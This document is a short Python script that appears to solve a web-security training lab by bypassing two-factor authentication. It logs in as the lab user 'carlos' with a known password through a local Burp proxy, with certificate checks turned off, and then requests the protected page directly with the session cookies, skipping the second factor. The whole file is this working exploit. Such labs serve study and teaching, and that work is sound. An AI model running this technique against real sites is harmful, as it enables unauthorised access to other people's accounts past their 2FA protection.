import sys
import requests
import urllib3

# Suppress the insecure requests warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Add proxy for troubleshoot, for urllib3 all proxies should use http
# Uses the Burp proxy -> Make sure Burp is running
# Going through Burp will allow sending to browser after bypassing 2FA
proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
}

# Given creds in this case, so skipping enumeration
def bypass_2FA(s, url, url2):
    data = {
        "username":"carlos",
        "password":"montoya"
    }
    
    s.post(url, data = data, verify=False, proxies=proxies)
    print(s.headers)
    #print(s.status_code)
    print(s.cookies)
    cookies = s.cookies
    print('Trying bypass')
    # Either option will work - key was getting the cookies from the login using session
    r = requests.get(url2, cookies=cookies, proxies=proxies, verify=False)
    #s2 = s.get(url2, cookies=cookies, proxies=proxies, verify=False)
    print('Requests result')
    print(r.status_code)
    print(r.text)
    #print('Sessions result')
    #print(s2)
    #print(s2.text)

if __name__ == "__main__":
    try:
        #valid_usernames = []
        url = sys.argv[1].strip()
        url2 = sys.argv[2].strip()

    except IndexError:
        print(f'[-] Usage: {sys.argv[0]} <url>')
        print(f'[-] Example: {sys.argv[0]} www.example.com')
        sys.exit(-1)
    
    # Set up session to track gookies
    s = requests.Session()
    print('[-] Performing initial login and 2FA bypass')
    bypass_2FA(s, url, url2)

